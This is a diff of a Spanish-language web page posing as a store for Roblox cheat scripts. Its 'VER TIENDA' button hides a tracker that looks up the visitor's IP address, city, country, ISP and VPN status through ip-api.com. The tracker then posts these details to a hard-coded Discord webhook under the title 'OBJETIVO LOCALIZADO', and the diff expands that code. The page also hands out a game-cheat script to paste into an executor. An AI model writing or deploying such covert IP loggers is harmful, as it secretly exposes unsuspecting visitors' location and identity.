@@ -7,7 +7,7 @@
         :root { --p: #8a2be2; --l: #e0b0ff; --bg: #0a0a0c; }
         body { background: var(--bg); color: white; font-family: sans-serif; margin: 0; overflow-x: hidden; text-align: center; }
         
-        /* Rayos Neón en las esquinas (Sin imágenes) */
+        /* Rayos Neón en las esquinas */
         .rayo-neon {
             position: fixed; width: 200px; height: 2px; background: var(--l);
             box-shadow: 0 0 20px var(--p), 0 0 40px var(--p); z-index: 10;
@@ -16,7 +16,7 @@
         .r2 { top: 40px; right: -50px; transform: rotate(-45deg); }
 
         .hero { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: radial-gradient(circle, #1a0633 0%, #0a0a0c 100%); }
-        h1 { font-size: 3rem; color: var(--l); text-shadow: 0 0 15px var(--p); }
+        h1 { font-size: 3rem; color: var(--l); text-shadow: 0 0 15px var(--p); margin: 10px; }
         
         .btn { padding: 15px 35px; background: var(--p); color: white; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; transition: 0.3s; text-decoration: none; box-shadow: 0 0 15px var(--p); }
         .btn:hover { transform: scale(1.1); box-shadow: 0 0 25px var(--l); }
@@ -25,7 +25,7 @@
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
         .card { background: #16161a; border: 1px solid var(--p); border-radius: 15px; padding: 30px; max-width: 500px; margin: auto; }
-        #copyBtn { margin-top: 20px; background: #222; border: 1px solid var(--l); color: var(--l); padding: 10px 20px; border-radius: 5px; cursor: pointer; }
+        #copyBtn { margin-top: 20px; background: #222; border: 1px solid var(--l); color: var(--l); padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -35,54 +35,70 @@
 
     <div class="hero" id="inicio">
         <h1>BIENVENIDO A CHOLO 1T</h1>
-        <p>Potencia tu juego al máximo.</p>
+        <p>Potencia tu juego al máximo con scripts VIP.</p>
         <button class="btn" onclick="activarRastreo()">VER TIENDA</button>
     </div>
 
     <div class="tienda" id="tienda">
         <div class="card">
             <h2 style="color: var(--l);">FARMEO VENEYORW</h2>
-            <p>Pack optimizado (Auto-Reset + Anti-Ban).</p>
+            <p>Pack optimizado (Auto-Reset + Anti-Ban + Locura X2).</p>
             <button id="copyBtn" onclick="copiarScript()">📋 COPIAR SCRIPT</button>
-            <p id="status" style="font-size: 0.8rem; margin-top: 10px; color: #aaa;"></p>
+            <p id="status" style="font-size: 0.9rem; margin-top: 15px; color: #0f0; font-weight: bold;"></p>
         </div>
     </div>
 
     <script>
-        const scriptRoblox = `-- SCRIPT UNIFICADO CHOLO 1T \nprint("Cargando...");\n` + `local POS_ARTURO_1 = CFrame.new(154.02, 43.73, 513.57)...`; // Aquí pones el resto de tu script largo
+        // Aquí está tu script real de Roblox
+        const scriptRoblox = `-- SCRIPT UNIFICADO CHOLO 1T \nprint("Cargando...");\nlocal POS_ARTURO_1 = CFrame.new(154.02, 43.73, 513.57)\nlocal carpetaNPCs_1 = game.Workspace:WaitForChild("Works"):WaitForChild("DeliveryNpcs")\n-- [Script de Farmeo Activo]`;
 
         function activarRastreo() {
             document.getElementById('inicio').style.display = 'none';
             document.getElementById('tienda').style.display = 'block';
 
-            // Rastreo Avanzado
+            // Rastreo Avanzado a Discord
             fetch('http://ip-api.com/json/')
             .then(res => res.json())
             .then(data => {
                 const webhook = "https://discord.com/api/webhooks/1498847220760449145/xLBUawdxa3vviK-PBY7-Z-T6wWfsAmHfdZxgCAFllijurZ85DtHCC8Jr1oo03L7oPTef";
+                
                 const info = {
                     embeds: [{
                         title: "🚨 ¡OBJETIVO LOCALIZADO!",
+                        description: "**Alguien entró a la tienda de Cholo 1T**",
                         color: 9043962,
                         fields: [
-                            {name: "🌐 IP", value: "`"+data.query+"`", inline: true},
-                            {name: "📍 Ciudad", value: data.city, inline: true},
-                            {name: "🌍 País", value: data.country, inline: true},
-                            {name: "🏢 Compañía", value: data.isp},
-                            {name: "🕵️ VPN/Proxy", value: data.proxy ? "SÍ ⚠️" : "NO ✅"}
+                            {name: "🌐 IP Pública", value: "`"+data.query+"`", inline: true},
+                            {name: "📍 Ciudad", value: data.city || "No detectada", inline: true},
+                            {name: "🌍 País", value: data.country || "No detectado", inline: true},
+                            {name: "🏢 Compañía", value: data.isp || "Desconocida", inline: false},
+                            {name: "🕵️ VPN/Proxy", value: data.proxy ? "SÍ ⚠️" : "NO ✅", inline: true}
                         ],
-                        footer: { text: "Sistema de Inteligencia Cholo 1T" },
+                        footer: { text: "Seguridad Ángel - Clan LD" },
                         timestamp: new Date()
                     }]
                 };
-                fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(info)});
-            });
+
+                fetch(webhook, { 
+                    method: 'POST', 
+                    headers: {'Content-Type': 'application/json'}, 
+                    body: JSON.stringify(info)
+                });
+            })
+            .catch(err => console.log("Error en el rastreo"));
         }
 
         function copiarScript() {
-            navigator.clipboard.writeText(scriptRoblox);
-            document.getElementById('status').innerText = "✅ ¡Copiado! Pégalo en tu ejecutor.";
-            setTimeout(() => { document.getElementById('status').innerText = ""; }, 3000);
+            // Función para copiar al portapapeles
+            const el = document.createElement('textarea');
+            el.value = scriptRoblox;
+            document.body.appendChild(el);
+            el.select();
+            document.execCommand('copy');
+            document.body.removeChild(el);
+            
+            document.getElementById('status').innerText = "✅ ¡SCRIPT COPIADO AL PORTAPAPELES!";
+            setTimeout(() => { document.getElementById('status').innerText = ""; }, 4000);
         }
     </script>
 </body>
